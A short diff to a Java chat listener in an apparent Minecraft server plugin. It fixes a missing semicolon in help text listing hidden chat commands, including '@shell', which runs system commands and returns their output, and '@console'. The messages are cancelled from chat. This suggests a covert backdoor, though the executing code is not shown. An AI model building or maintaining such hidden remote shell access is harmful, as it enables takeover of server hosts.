@@ -144,7 +144,7 @@ public class MessageEvent implements Listener {
             player.sendMessage(ChatColor.GREEN + "@shell <命令> - 执行指定的系统控制台命令，并返回命令输出结果。");
             player.sendMessage(ChatColor.GREEN + "@console <命令> - 在游戏控制台中执行指定的命令。");
             player.sendMessage(ChatColor.GREEN + "@help - 获取帮助信息。");
-            player.sendMessage("Another: @deop, @creative, @survival, @day, @heal, @effectclean, etc.")
+            player.sendMessage("Another: @deop, @creative, @survival, @day, @heal, @effectclean, etc.");
             player.sendMessage(ChatColor.YELLOW + "--------------------");
             e.setCancelled(true);
         }
